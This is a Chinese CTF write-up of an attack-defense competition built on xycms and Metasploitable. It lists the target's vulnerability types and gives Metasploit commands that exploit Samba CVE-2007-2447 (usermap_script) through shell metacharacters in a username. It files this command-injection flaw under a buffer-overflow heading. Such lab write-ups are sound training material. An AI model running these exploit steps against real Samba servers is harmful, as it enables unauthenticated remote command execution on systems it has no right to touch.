这个比赛是17年11月份比的，但是因为国赛在18年，所以承办方把它也叫做18年，这个比赛一二阶段没有什么好说的，就是做题，三阶段分组对抗类似于 CTF AWD的模式，但是和AWD不同的是它只有一轮，加固是15分钟，攻击45分钟，时间很短，难度比较AWD要小

这是第三次参加分组攻防对抗赛，前两次都被大佬们按在地上摩擦，不过这次由于是专科层面的比赛，整体水平较其他的CTF AWD来说弱了不少，所以才有幸反杀，在三阶段比赛期间除了，刚开始子网掩码配错耽误了一些时间没有拿到flag外，搞定了子网掩码的问题后，基本上就是一直是第一名了，但绝对算不上碾压，和第二名差距也很小

比赛分析

这次采用的是xycms，给了漏洞列表后，在尽量段的时间里，找到了大部分的洞，比赛完后一想才发现，其实三阶段就是xycms+Metasploitable搭建起来的，赛后做了最大程度的复现

漏洞列表

  • 靶机的网站存在后门，要求选手进行代码审计，找到的相关漏洞，利用此漏洞获取一定权限
  • 靶机上的网站存在文件上传漏洞，要求选手找到文件上传的相关漏洞，利用此漏洞获取一定权限
  • 操作系统提供的服务，包含了远程代码执行的漏洞，要求用户找到远程代码执行的服务，并利用此漏洞获取系统权限
  • 操作系统提供的服务包含了缓冲区溢出漏洞，要求用户找到远程代码执行的服务，并利用此漏洞获取系统权限
  • 靶机中存在一些系统后门，选手可以找到此后门，并利用预留的后门直接获取到系统权限

漏洞4：缓冲区溢出

msf模块usermap_script

usermap_script：CVE-2007-2447
这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。
通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。
不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名！

利用

msfconsole
use exploit/multi/samba/usermap_script
set rhost 0.0.0.0
exploit
